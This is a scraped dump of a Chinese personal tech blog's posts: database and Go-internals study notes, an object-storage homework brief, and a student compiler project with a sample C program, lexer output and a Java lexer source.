WAL是预写日志，需要保证日志落盘才能够进行事务提交。日志中包含了事务对数据的修改，宕机后通过解析WAL日志，就可以对数据进行恢复。\n  相比于每次事务提交时都对数据页面进行flush操作，WAL日志有以下优点：\n 解决了IO放大的问题。 随机读写变为顺序读写，对磁盘更友好。    除了Undo Log之外，还有shadow paging的方式。例如PostgreSQL就是采用这种方式。这种方式的特点是，在数据页面中同时保留了一行数据的多个历史版本，通过trx_id来区分。\n  基于代价的优化器一般需要考虑IO消耗、网络消耗、CPU消耗等。\n  常见的执行模型有三类：火山模型(Volcano Model/Pipeline Model/Iterator Model/Pull Model)、物化模型(Materialization Model/Push Model)、向量化模型(Vectorized / Batch Model)。\n  B+树的优点如下：\n B+树内部节点不存储数据，只存储键值，这样，每个节点就能存储更多的键值，一次性也就能将更多的键值读入内存，减少了对磁盘的IO操作次数； B+树的叶节点有一条链相连，所以对于区间内查询数据比较高效。    InnoDB的buffer pool通过一个hash_map\u0026lt;page_id, page_ptr\u0026gt;来实现页面的快速查找访问，通过一个LRU来实现页面的冷热淘汰管理。\n  day14.1 TOS对象存储 https://live.juejin.cn/4354/yc_TOS\nhttps://bytedance.feishu.cn/file/boxcn3SOO7DkrVWzb93qx08jtch\n课后作业-实现一个对象存储客户端 作业要求：\n  在任意一个公有云中申请一个对象存储 Bucket\n  使用你熟悉的语言，实现一个对象存储命令行客户端，要求该客户端能够\n 创建对象：超过 1GB 的对象使用 MultiUpload 上传，小于 1GB 的使用 Put 上传 下载对象 删除对象 查看对象是否存在 列举对象及 CommonPrefix  \u0026lt; 作业提交截止时间：5月29日 10:00前 \u0026gt;\n  ","permalink":"https://kevinerr.github.io/posts/tech/%E5%AD%97%E8%8A%82%E9%9D%92%E8%AE%AD%E8%90%A5/","summary":"day1 go语言上手-基础语言 https://bytedance.feishu.cn/file/boxcnQnHXuDOdzd8CqVid7nQLmg 随机数 rand.Intn () 函数是个伪随机函数，不管运行多少次都只会返回同样的随机数，因为它默认的资源就是单一值，所以必须调用 rand.Seed (), 并","title":"字节青训营"},{"content":"https://www.bilibili.com/video/BV1hv411x7we\nstring unicode字符集，每个字符对应01串\n定长编码\u0026ndash;浪费内存\nUTF-8：变长编码，有类似于IP地址分类的前缀\nc存储字符串：\\0结束\ngo:go语言认为字符串内容不会被修改\ngo语言修改字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  /* 修改字符串 注意：字符串是无法被修改的，只能复制原字符串，在复制的版本上修改 方法1：转换为[]byte() 方法2：转换为[]rune() 方法3：新字符串代替原字符串的子字符串,用strings包中的strings.Replace() */ func main() { \t//方法1 \ts1 := \u0026#34;abcdefgabc\u0026#34; \ts2 := []byte(s1) \ts2[1] = \u0026#39;B\u0026#39; \tfmt.Println(string(s2)) //aBcdefgabc \t//方法2 \ts3 := []rune(s1) \ts3[1] = \u0026#39;B\u0026#39; \tfmt.Println(string(s3)) //aBcdefgabc \t//方法3 \tnew := \u0026#34;ABC\u0026#34; \told := \u0026#34;abc\u0026#34; \ts4 := strings.Replace(s1, old, new, 2) \tfmt.Println(s4) //ABCdefgABC }   slice new和make的区别： 二者都是内存的分配（堆上），但是make只用于slice、map以及channel的初始化（非零值）；而new用于类型的内存分配，并且内存置为零。所以在我们编写程序的时候，就可以根据自己的需要很好的选择了。\nmake返回的还是这三个引用类型本身；而new返回的是指向类型的指针。\nhttps://www.kancloud.cn/aceld/golang/1958314\n切片的截取 切片的扩容 为啥本来容量为3 但append一个元素容量就为6了呢\n结构体和内存对齐 CPU支持访问任意地址，是内部做了一些操作\n可以优化这个struct\ngolang map hash桶的确认 在map中对key的定位会先使用hash函数获取hash值，写入位置 index = hash%m，得到真正的写入位置。但是在golang中对index的定位有一点小优化，golang使用位与操作进行bucket的定位:\nindex = hash \u0026amp; (m-1) 为了保证key落在区间[0,m-1]，所以要保证m是2的整幂次，如果m是5，那么1-3注定是空桶。\n取模操作相对于位与操作，cpu的开销更大\n扩容 hmap bmap bmap中比较特殊的是kv的存储，bmap将8个key存在一起，将8个value存在一起，是key/key/\u0026hellip;.value/value\u0026hellip;这种存储，相对于将key/value/key/value这种存储设计，将key和value分开存储能使bmap内存布局更加紧密，只需要在最后增加padding对齐即可。\neg：可以计算下map[int64]int8 这种类型的map在上述两种存储设计中每个bmap分别占用的空间大小。\n如果将kv存在一起，总共需要的每对kv后需要填充7字节的padding，总共的padding为7*8 = 56字节\n但是如果将kv分开存储，8个key是对齐的，8个value也是对齐的，不需要额外的padding填充。\n溢出桶 常见的坑点 1、为了防止开发人员依赖map的顺序，对于每一次map遍历（range），得到结果的顺序都是不同的，因为在初始化迭代器（runtime.mapiterinit）时都对startBucket和startCell进行了random操作。\n2、无法比较的类型无法作为key\n3、map的value是无法寻址的，也就是说无法获取map value的地址。\n常见的case为：当value是struct类型，其值无法修改（最简单的解决方法就是value存成*T类型即可）；对map[key]取地址时报错。\nhttps://www.kancloud.cn/aceld/golang/1958315\n4、map不支持并发读写，只能并发读\n对于需要并发读写map的场景，常见的解决方案如下：\n  map + sync.RWMutex\n  采用 sync.map，实现是小粒度的锁+读写分离+原子操作\n  5、len(map)返回的是map中元素的个数，不是map的容量\n6、new出来的map是无法使用的，因为new只是malloc了8字节大小的内存（new返回指针）。\n相对的，make 是个语法糖，最终被编译器翻译成runtime.makemap 函数调用，会进行内存开辟和对象初始化操作。\n7、通过fmt打印map时，空map和nil map结果是一样的，都为map[]。所以，这个时候别断定map是空还是nil，而应该通过map == nil来判断。\n8、超出容量时会自动扩容，但尽量提供一个合理的初始值\n9、map作为函数的出参时不需要以指针形式进行传递，因为map本身就是指针，上文中map初始化一节也可以看到runtime.makemap返回的是*runtime.hmap。\n10、delete是不会真正地把map的内存释放的，要回收map还是需要设为nil\n总结 本文我们首先介绍了map的基本概念，了解到golang的map是基于hash表实现的且冲突解决方式采用链地址法，并简单介绍了map的基本操作。\n接下来我们深入源码，分别研究了map的内存模型、哈希函数、初始化、读取、写入、删除、扩容和遍历过程。map中非常核心的概念是桶，桶作为map数据查找和存储的基本单位，每个桶中有8个cell，key的hash值的低位决定了落入哪个bucket，高位则决定了落入哪个cell中，对于超过8个元素的桶，会在后边链上溢出桶做额外存储，而如果有太多的溢出桶或map的空闲容量较小的情况下，则会触发map的扩容，为了防止一次扩容带来的内存抖动和时延开销，map的扩容是渐进式的，会将扩容过程离散到每一次的数据写入操作中。\nchannel 发送数据 接收数据 多路select 总结 对一个已经被close过的channel进行接收操作依然可以接受到之前已经成功发送的数据\n其实你并不需要关闭每一个channel。只有当需要告诉接收者goroutine，所有的数据已经全部发送时才需要关闭channel。不管一个channel是否被关闭，当它没有被引用时将会被Go语言的垃圾自动回收器回收。（不要将关闭一个打开文件的操作和关闭一个channel操作混淆。对于每个打开的文件，都需要在不使用的时候调用对应的Close方法来关闭文件。）\n试图重复关闭一个channel将导致panic异常，试图关闭一个nil值的channel也将导致panic异常。关闭一个channels还会触发一个广播机制\nnil的channel有时候也是有一些用处的。因为对一个nil的channel发送和接收操作会永远阻塞，在select语句中操作nil的channel永远都不会被select到。\n这使得我们可以用nil来激活或者禁用case，来达成处理其它输入或输出事件时超时和取消的逻辑。\n堆内存管理1 https://zhuanlan.zhihu.com/p/76802887\nhttps://zhuanlan.zhihu.com/p/308054212\narena span（不同大小） page 内存块 mheap管理整个堆内存，arena对应heapArena结构，span对应mspan结构\nmheap中有个全局的mspan管理中心mheap.central，长度为136的数组，数组元素是一个mcentral结构\n一个mcentral对应一种mspan规格类型，记录在spanclass中\n全局mspan管理中心方便取用各种规格类型的mspan，为了保障多个p之间并发安全，免不了加锁解锁\ngo语言的每个p都有一个本地小对象缓存\n当p需要用到指定规格类型的mspan时，先去本地缓存这里找对应的mspan，如果没有或用完了就去mcentral获取一个放到本地\n","permalink":"https://kevinerr.github.io/posts/tech/%E5%B9%BC%E9%BA%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4/","summary":"https://www.bilibili.com/video/BV1hv411x7we string unicode字符集，每个字符对应01串 定长编码\u0026ndash;浪费内存 UTF-8：变长编码，有类似于IP地址分类的前缀 c存储字符串：\\0","title":"幼麟实验室"},{"content":"此项目为GXU编译原理课设，适合低要求，混及格同学，内涵完整代码(1k行+)、文件和论文(1w字+)\n运行环境:eclipse\n词法模块内容 （1）确定源语言C和编写编译程序的语言java；\n（2）用正规式描述C的词法规则；\n（3）根据正规式构造给出识别单词的DFA M；\n（4）根据M，用语言java编写C的词法分析程序。\n（5）读入源程序字符串，识别具有独立含义的最小语法单位——单词；\n（6）对识别过程中发现的词法问题，则输出有关的错误信息；\n语法模块内容 （1）本次实验中采用的设计方法是lr1，首先便是要设计好文法。\n（2）能根据文法构造项目集族。\n（3）再根据项目集族进行lr1分析表的构造，写成xls文件。\n（4）设计程序读取lr1分析表.xls与文法.xls文件。\n（5）根据这两个文件完成语法检查。\n（6）对不正确的语法不能通过语法检查并要停留在这一步表明出错。\n语义模块内容 （1）初设语法制导翻译，缕清语义程序的思路\n（2）设计编写语义程序的全局属性\n（3）设计编写语义程序的方法\n（4）设计编写每个产生式对应的语义程序\n（5）将语义程序得到的四元式表打印到文本中\n代码结构 input.txt 为需要编译的c语言代码\n1 2 3 4 5 6 7 8 9 10 11  #include\u0026lt;stdio.h\u0026gt;void main(){ \tint i=0,max=0; \tint a[6]={1,4,6,2,8,9}; \twhile(i\u0026lt;6){ \tif(max\u0026lt;a[i]){ \tmax=a[i]; \t} \ti++; \t} }   output.txt 为词法分析后的输出结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  1`#include 26`\u0026lt; 8`stdio.h 27`\u0026gt; 6`void 22`main 40`( 41`) 43`{ 2`int 22`i 24`= 23`0 46`, 22`max 24`= 23`0 47`; 2`int 22`a 44`[ 23`6 45`] 24`= 43`{ 23`1 46`, 23`4 46`, 23`6 46`, 23`2 46`, 23`8 46`, 23`9 42`} 47`; 15`while 40`( 22`i 26`\u0026lt; 23`6 41`) 43`{ 16`if 40`( 22`max 26`\u0026lt; 22`a 44`[ 22`i 45`] 41`) 43`{ 22`max 24`= 22`a 44`[ 22`i 45`] 47`; 42`} 22`i 38`++ 47`; 42`} 42`}   Lexer.java 为词法分析代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 639 640 641 642 643 644 645 646 647 648 649 650 651 652 653  package compile3; import java.io.*; import java.util.ArrayList; import java.util.List;  class LexicalError extends Error {   public LexicalError(String string) {  } }   public class Lexer { \t static int i = 0;  static String keywords[] = {\u0026#34;#include\u0026#34;,\u0026#34;int\u0026#34;,\u0026#34;float\u0026#34;,\u0026#34;int26\u0026#34;,  \u0026#34;double\u0026#34;,\u0026#34;void\u0026#34;,\u0026#34;math.h\u0026#34;,  \u0026#34;stdio.h\u0026#34;,\u0026#34;stdlib.h\u0026#34;,\u0026#34;string.h\u0026#34;,\u0026#34;malloc.h\u0026#34;,  \u0026#34;return\u0026#34;,\u0026#34;for\u0026#34;,\u0026#34;do\u0026#34;,\u0026#34;while\u0026#34;,  \u0026#34;if\u0026#34;,\u0026#34;else\u0026#34;,\u0026#34;break\u0026#34;,\u0026#34;printf\u0026#34;,\u0026#34;%d\u0026#34;,\u0026#34;%f\u0026#34;};  //\u0026#34;stdio.h\u0026#34;,\u0026#34;math.h\u0026#34;,\u0026#34;stdlib.h\u0026#34;  static List\u0026lt;Character\u0026gt; sourceCode=new ArrayList\u0026lt;Character\u0026gt;();  static String filename=\u0026#34;src/LexerOutput.txt\u0026#34;;   public static void getTokenLiteral(char c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+\u0026#34;char\u0026#34;+\u0026#34;\u0026gt;\u0026#34;);  i++;  }   public static void getTokenNumber(char c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+\u0026#34;number\u0026#34;+\u0026#34;\u0026gt;\u0026#34;);  i++;  }   public static void getTokenOperation(char c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+11)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenKeywords(String c,int i) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+i+\u0026#34;\u0026gt;\u0026#34;);   }  public static void getTokenSymbol(char c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+12)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenIdentifier(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+1)+\u0026#34;\u0026gt;\u0026#34;);  }  public static void getTokenSelfadding(String c) {//++  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+3)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenSelfdecrement(String c) {//--  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+38+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenLogicand(String c) {//\u0026amp;\u0026amp;  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+5)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenLogicor(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+6)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenLogicalnon(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+7)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenLogicequality(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+8)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenGreaterequal(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+9)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenLessequal(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+10)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenNumber1(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+2)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getTokenkexuejishu(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+13)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public static void getArray(String c) {  System.out.println(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+14)+\u0026#34;\u0026gt;\u0026#34;);  i++;  }  public void lexicalAnalysis() throws IOException{  BufferedWriter writer=new BufferedWriter(new FileWriter(filename));  String file = \u0026#34;src/input.txt\u0026#34;;  Reader reader = null;  try {  reader = new InputStreamReader(new FileInputStream(file));  int tempchar;  while ((tempchar = reader.read()) != -1) {  if (((char) tempchar) != \u0026#39;\\r\u0026#39;) {  sourceCode.add((char) tempchar);  }  }  } catch (Exception e) {  e.printStackTrace();  }  while (i \u0026lt; sourceCode.size()) {  char c = sourceCode.get(i);  String s = String.valueOf(c);  String string=\u0026#34;\u0026#34;;  boolean flag=true;  boolean kw=false;  boolean findoneid=false;  while(true) {  if (s.matches(\u0026#34;[A-Za-z%#]\u0026#34;)) {  string=string+s;  i++;  s=String.valueOf(sourceCode.get(i));  while(s.matches(\u0026#34;[A-Za-z0-9.]\u0026#34;)) {  flag=false;  string=string+s;  i++;  s=String.valueOf(sourceCode.get(i));  }  if(flag) {  getTokenIdentifier(string);  writer.write(keywords.length+1+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  for (int i=0;i\u0026lt;keywords.length;i++) {  if(string.equals(keywords[i])) {  getTokenKeywords(string,(i+1));  writer.write(i+1+\u0026#34;`\u0026#34;+string);  writer.newLine();  kw=true;  break;  }  }  if(!kw) {  getTokenIdentifier(string);  writer.write(keywords.length+1+\u0026#34;`\u0026#34;+string);  writer.newLine();  break;  }   }  else {  break;  }  }  flag=true;  c = sourceCode.get(i);  string=\u0026#34;\u0026#34;;//仅仅是点后面无数字  boolean singlepoint = false;  boolean findpoint = false;  while(true) {  if(s.matches(\u0026#34;[0]\u0026#34;)) {  string=string+s;  i++;  s=String.valueOf(sourceCode.get(i));  if(s.matches(\u0026#34;[0-9]\u0026#34;)){  writer.close();  throw new LexicalError(\u0026#34;unexpected char ${c}\u0026#34;);  }  if(s.matches(\u0026#34;[.]\u0026#34;)) {//是0.  singlepoint = true;  string=string+s;  i++;  s=String.valueOf(sourceCode.get(i));  while(s.matches(\u0026#34;[0-9]\u0026#34;)){  if(s.matches(\u0026#34;[0-9]\u0026#34;)) {  singlepoint = false;  string = string + s;  i++;  s = String.valueOf(sourceCode.get(i));  }  else{  singlepoint = true;  }  }  if(singlepoint) {//小数点后留空直接写数字以外的抛出异常  writer.close();  throw new LexicalError(\u0026#34;unexpected char ${c}\u0026#34;);  }else {  getTokenNumber1(string);//输出0.xxxx  writer.write(keywords.length+2+\u0026#34;`\u0026#34;+string);  writer.newLine();  i--;  break;  }  }else {//仅仅是0  getTokenNumber1(string);  writer.write(keywords.length+2+\u0026#34;`\u0026#34;+string);  writer.newLine();  i--;  break;  }  }  if (s.matches(\u0026#34;[1-9]\u0026#34;)) {//1-9开头的int或double  string=string+s;  i++;  s=String.valueOf(sourceCode.get(i));  while(s.matches(\u0026#34;[0-9.]\u0026#34;)) {//int  flag=false;  string=string+s;  if(s.matches(\u0026#34;[.]\u0026#34;)) {  findpoint = true;  singlepoint = true;  break;  }  i++;  s=String.valueOf(sourceCode.get(i));  }  if(findpoint) { //\tstring=string+s;  i++;  s=String.valueOf(sourceCode.get(i));  while(s.matches(\u0026#34;[0-9]\u0026#34;)) {//double  if(s.matches(\u0026#34;[0-9]\u0026#34;)) {  singlepoint = false;  string = string + s;  i++;  s = String.valueOf(sourceCode.get(i));  }  else{  singlepoint = true;  }  }  if(singlepoint) {//小数点后留空直接写数字以外的抛出异常  throw new LexicalError(\u0026#34;unexpected char ${c}\u0026#34;);  }else if(singlepoint){  getTokenNumber1(string);  writer.write(keywords.length+2+\u0026#34;`\u0026#34;+string);  writer.newLine();  i--;  break;  }  }  if(flag) {  getTokenNumber1(string);//仅仅是1-9单数字  writer.write(keywords.length+2+\u0026#34;`\u0026#34;+string);  writer.newLine();  i--;  findoneid=true;  break;  }  else{  getTokenNumber1(string);//int多数字  writer.write(keywords.length+2+\u0026#34;`\u0026#34;+string);  writer.newLine();  i--;  break;  }  }  else {  break;  }  }  c = sourceCode.get(i);  string=\u0026#34;\u0026#34;;  while(true) {  if(c==\u0026#39;+\u0026#39;) {  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;+\u0026#39;) {  string=string+\u0026#39;+\u0026#39;;  getTokenSelfadding(string);  writer.write(38+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  string=\u0026#34;\u0026#34;;  while(true) {//--38  if(c==\u0026#39;-\u0026#39;) {  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;-\u0026#39;) {  string=string+\u0026#39;-\u0026#39;;  getTokenSelfdecrement(string);  writer.write(39+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  //------------------------  string=\u0026#34;\u0026#34;;  while(true) {//\u0026amp;\u0026amp;34  if(c==\u0026#39;\u0026amp;\u0026#39;) {  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;\u0026amp;\u0026#39;) {  string=string+\u0026#39;\u0026amp;\u0026#39;;  getTokenLogicand(string);  writer.write(35+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  string=\u0026#34;\u0026#34;;  while(true) {//||35  if(c==\u0026#39;|\u0026#39;) {  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;|\u0026#39;) {  string=string+\u0026#39;|\u0026#39;;  getTokenLogicor(string);  writer.write(36+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  string=\u0026#34;\u0026#34;;  while(true) {//!=29  if(c==\u0026#39;!\u0026#39;) {  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;=\u0026#39;) {  string=string+\u0026#39;=\u0026#39;;  getTokenLogicalnon(string);  writer.write(30+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  string=\u0026#34;\u0026#34;;  while(true) {  if(c==\u0026#39;=\u0026#39;) {//==24  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;=\u0026#39;) {  string=string+\u0026#39;=\u0026#39;;  getTokenLogicequality(string);  writer.write(25+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  string=\u0026#34;\u0026#34;;  while(true) {  if(c==\u0026#39;\u0026gt;\u0026#39;) {//\u0026gt;=27  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;=\u0026#39;) {  string=string+\u0026#39;=\u0026#39;;  getTokenGreaterequal(string);  writer.write(28+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  string=\u0026#34;\u0026#34;;  while(true) {  if(c==\u0026#39;\u0026lt;\u0026#39;) {//\u0026lt;=28  string=string+s;  i++;  if(sourceCode.get(i)==\u0026#39;=\u0026#39;) {  string=string+\u0026#39;=\u0026#39;;  getTokenLessequal(string);  writer.write(29+\u0026#34;`\u0026#34;+string);  writer.newLine();  findoneid=true;  break;  }  else {  i--;  break;  }  }  else{  break;  }  }  //------------------------case语句测试  string = \u0026#34;\u0026#34;;  while(sourceCode.get(i)==\u0026#39;\\\u0026#39;\u0026#39;) {  i++;  string = string+\u0026#39;\\\u0026#39;\u0026#39;;  writer.write(\u0026#39;\\\u0026#39;\u0026#39;);  writer.newLine();  c = sourceCode.get(i);  switch(c) {  case \u0026#39;Z\u0026#39;:{  string=string+c;  i++;  writer.write(c);  writer.newLine();  break;  }  default:  throw new LexicalError(\u0026#34;unexpected char ${c}\u0026#34;);  }  if(sourceCode.get(i)==\u0026#39;\\\u0026#39;\u0026#39;) {  string+=\u0026#39;\\\u0026#39;\u0026#39;;  i++;  writer.write(\u0026#39;\\\u0026#39;\u0026#39;);  writer.newLine();  System.out.println(\u0026#34;\u0026lt;\u0026#34;+string+\u0026#34;`\u0026#34;+\u0026#34;100\u0026gt;\u0026#34;);  break;  }  else {  throw new LexicalError(\u0026#34;unexpected char ${c}\u0026#34;);  }  }  string=\u0026#34;\u0026#34;;  //------------------------------  c = sourceCode.get(i);  switch (c) {  case \u0026#39;$\u0026#39;:{  writer.write(\u0026#39;$\u0026#39;);  writer.newLine();  writer.close();  return;}  case \u0026#39;\\n\u0026#39;:  case \u0026#39;\\t\u0026#39;:  case \u0026#39; \u0026#39;: {  i++;  break;  }  case \u0026#39;=\u0026#39;:{  getTokenOperation(c);  writer.write(24+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;*\u0026#39;:  {  getTokenOperation(c);  writer.write(33+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;+\u0026#39;:  {  getTokenOperation(c);  writer.write(31+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;-\u0026#39;:  {  getTokenOperation(c);  writer.write(32+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;/\u0026#39;:  {  getTokenOperation(c);  writer.write(34+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;^\u0026#39;:  case \u0026#39;:\u0026#39;:{  break;  }  case \u0026#39;[\u0026#39;:  {  getTokenOperation(c);  writer.write(44+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;]\u0026#39;:  {  getTokenOperation(c);  writer.write(45+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;!\u0026#39;:  {  getTokenOperation(c);  writer.write(37+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;\u0026lt;\u0026#39;:  {  getTokenOperation(c);  writer.write(26+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;\u0026gt;\u0026#39;:  {  getTokenOperation(c);  writer.write(27+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;}\u0026#39;:  {  getTokenOperation(c);  writer.write(42+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;{\u0026#39;:  {  getTokenOperation(c);  writer.write(43+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;\u0026#34;\u0026#39;:  {  getTokenOperation(c);  writer.write(48+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;(\u0026#39;:  {  getTokenOperation(c);  writer.write(40+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;)\u0026#39;:  {  getTokenOperation(c);  writer.write(41+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;;\u0026#39;:  {  getTokenOperation(c);  writer.write(47+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }  case \u0026#39;,\u0026#39;:  {  getTokenOperation(c);  writer.write(46+\u0026#34;`\u0026#34;+c);  writer.newLine();  break;  }   case \u0026#39;\u0026amp;\u0026#39;: {  getTokenSymbol(c);  writer.write(c);  //writer.write(\u0026#34;\u0026lt;\u0026#34;+c + \u0026#34;,\u0026#34;+(keywords.length+12)+\u0026#34;\u0026gt;\u0026#34;);  writer.newLine();  break;  }  default:  if(!findoneid) {  throw new LexicalError(\u0026#34;unexpected char ${c}\u0026#34;);  }  else {  break;  }   }  }  writer.close();  }  public static void main(String[] args)throws IOException{  Lexer lexer=new Lexer();  lexer.lexicalAnalysis();  }   public List\u0026lt;String\u0026gt; getWord(String filename) {  List\u0026lt;String\u0026gt; words = new ArrayList();  String line;  try {  BufferedReader in = new BufferedReader(new FileReader(filename));  line = in.readLine();  words.add(line);  while(line != null) {  line = in.readLine();  if(line == null) {  break;  }  words.add(line);  }  } catch (Exception e) {  // TODO: handle exception  }  return words;  } }   lr1.xls (人工操作)\ngrammar.xls （人工操作）\nlr1.java 语法分析代码，将词法分析后的txt文件进行语法检验，它需要用到lr1.xls、grammar.xls文件\n截取部分运行结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 